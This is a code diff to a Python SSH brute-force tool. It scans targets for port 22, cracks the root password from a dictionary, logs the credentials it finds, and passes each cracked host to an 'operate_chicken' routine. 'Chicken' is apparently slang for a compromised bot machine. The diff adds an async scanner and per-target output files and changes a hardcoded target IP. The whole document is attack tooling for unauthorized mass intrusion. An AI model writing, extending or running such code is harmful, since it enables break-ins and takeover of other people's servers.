@@ -14,8 +14,11 @@ OPERATE_INTERVAL = 3
 
 def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
     if brute_type is 'ssh':
+        global chicken_info_file
+        chicken_info_file = host.replace('/', 'mask') + '.txt'
         print('[+] Start scan host '+host)
-        for open_host_info in ssh_scan_all(host, 22):
+        ssh_scan = RiverNmapScan()
+        for open_host_info in ssh_scan.scan_async(host, 22, 'ssh'):
             print('[*] Start brute ', open_host_info['ip'])
             brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
             with open(CHICKEN_PATH+'scan.log', 'a') as logfile:
@@ -28,7 +31,7 @@ def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=MAX_CONNEC
                   'password: '+brute_ret['key'])
             time.sleep(OPERATE_INTERVAL)
             operate_chicken(brute_ret)
-        print('[+] End scan.')
+        print('[+] End scan and brute.')
 
 
 def main(host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
@@ -38,7 +41,7 @@ def main(host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
 
 
 if __name__ == "__main__":
-    host = '10.108.36.213'
+    host = '10.108.36.71'
     user = 'root'
     main(host, user, SSH_DICTIONARY)
     # file_info = read_file()
